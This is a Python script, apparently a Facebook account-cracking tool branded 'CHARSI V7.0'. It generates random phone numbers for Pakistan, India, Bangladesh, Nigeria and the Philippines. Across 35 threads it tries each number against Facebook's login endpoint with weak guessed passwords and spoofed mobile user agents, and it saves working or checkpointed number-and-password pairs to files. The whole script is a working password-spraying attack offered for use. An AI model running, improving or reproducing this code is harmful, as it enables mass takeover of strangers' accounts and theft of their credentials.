#--------------------------------------------------------------#
# OWNER: CHARSI / MYSTERY | VERSION: V7.0 AUTO-FILE ULTIMATE
# UPDATE: AUTOMATIC FILE SAVING + YEAR + ACTIVE CHECKER
# STATUS: OK/CP/UNVERIFIED ALL COUNTRIES WORKING
#--------------------------------------------------------------#
import os, sys, time, json, re, random, uuid, requests
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# Global Storage
loop, oks, cps = 0, [], []
current_time = datetime.now().strftime("%d-%m-%Y_%H-%M")
ok_file = f"CHARSI_OK_{current_time}.txt"
cp_file = f"CHARSI_CP_{current_time}.txt"

def generate_ua():
    """ 2025 Professional UA Engine """
    and_v = random.choice(['13','14','15'])
    mod = random.choice(['SM-S928B', 'SM-G998B', '23127PN0CG', 'V2303', 'RMX3301'])
    chrome = f"{random.randint(125, 131)}.0.{random.randint(5000, 7000)}.{random.randint(100, 160)}"
    return f'Mozilla/5.0 (Linux; Android {and_v}; {mod}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randint(480,510)}.0.0.0;]'

def get_year(uid):
    """ Advanced UID Year Detector """
    if uid.startswith('100000'): return '2009-2010'
    elif uid.startswith('10000'): return '2011-2013'
    elif uid.startswith('1000'): return '2014-2017'
    elif uid.startswith('6155'): return '2023-2024'
    elif uid.startswith('5'): return '2024-2025'
    else: return 'New Account'

def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(V7.0-ULTIMATE)
----------------------------------------------
 OWNER   :  CHARSI / MYSTERY
 SAVE    :  /sdcard/CHARSI_FILES/
 UPDATE  :  YEAR DETECTOR + AUTO-FILE MAKER
----------------------------------------------''')

def ___CHARSI_ULTIMATE___(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mCHARSI-V7\033[1;90m] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            ua = generate_ua()
            headers = {
                'Host': 'graph.facebook.com',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': ids, 'password': pas, 'generate_session_cookies': '1', 'method': 'auth.login'
            }
            res = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            
            if 'session_key' in res:
                uid = str(res['uid'])
                year = get_year(uid)
                print(f'\r\r \033[1;32m[CHARSI-OK] {uid} | {pas} | {year} | ACTIVE')
                oks.append(uid)
                if not os.path.exists('/sdcard/CHARSI_FILES'): os.makedirs('/sdcard/CHARSI_FILES')
                with open(f'/sdcard/CHARSI_FILES/{ok_file}', 'a') as f:
                    f.write(f"{uid}|{pas}|{year}|ACTIVE\n")
                break
            
            elif 'checkpoint' in str(res):
                uid = ids
                year = get_year(uid)
                print(f'\r\r \033[1;33m[CHARSI-CP] {uid} | {pas} | {year}')
                cps.append(uid)
                if not os.path.exists('/sdcard/CHARSI_FILES'): os.makedirs('/sdcard/CHARSI_FILES')
                with open(f'/sdcard/CHARSI_FILES/{cp_file}', 'a') as f:
                    f.write(f"{uid}|{pas}|{year}\n")
                break
        loop += 1
    except: pass

def Charsi_Menu():
    logo()
    print(' [1] PAKISTAN RANDOM CLONING')
    print(' [2] INDIA RANDOM CLONING')
    print(' [3] BANGLADESH RANDOM CLONING')
    print(' [4] NIGERIA RANDOM CLONING')
    print(' [5] PHILIPPINES RANDOM CLONING')
    print(' [0] EXIT')
    choice = input('\n [•] CHOICE: ')
    
    codes_map = {
        '1': ['0300','0301','0345','0312','0333','0321'],
        '2': ['+91700','+91800','+91900','+91600'],
        '3': ['+88017','+88018','+88019','+88013'],
        '4': ['+234803','+234806','+234703','+234810'],
        '5': ['+63917','+63918','+63920','+63916']
    }
    
    if choice not in codes_map: exit()
    all_codes = codes_map[choice]
    limit = int(input(' [•] LIMIT PER CODE: '))
    
    with tred(max_workers=35) as pool:
        logo()
        print(f' [•] OK IDs FILE: /sdcard/CHARSI_FILES/{ok_file}')
        print('----------------------------------------------')
        for code in all_codes:
            for _ in range(limit):
                uid = code + str(random.randint(1111111, 9999999))
                # Heavy Professional Passwords
                pws = [uid, uid[:6], uid[:7], uid[3:], '123456', '1234567', '786786', 'pakistan', 'khan123']
                pool.submit(___CHARSI_ULTIMATE___, uid, pws)

    print(f'\n----------------------------------------------\n [•] DONE! TOTAL OK: {len(oks)}')
    print(f' [•] FILES SAVED IN /sdcard/CHARSI_FILES/')

if __name__ == '__main__':
    Charsi_Menu()
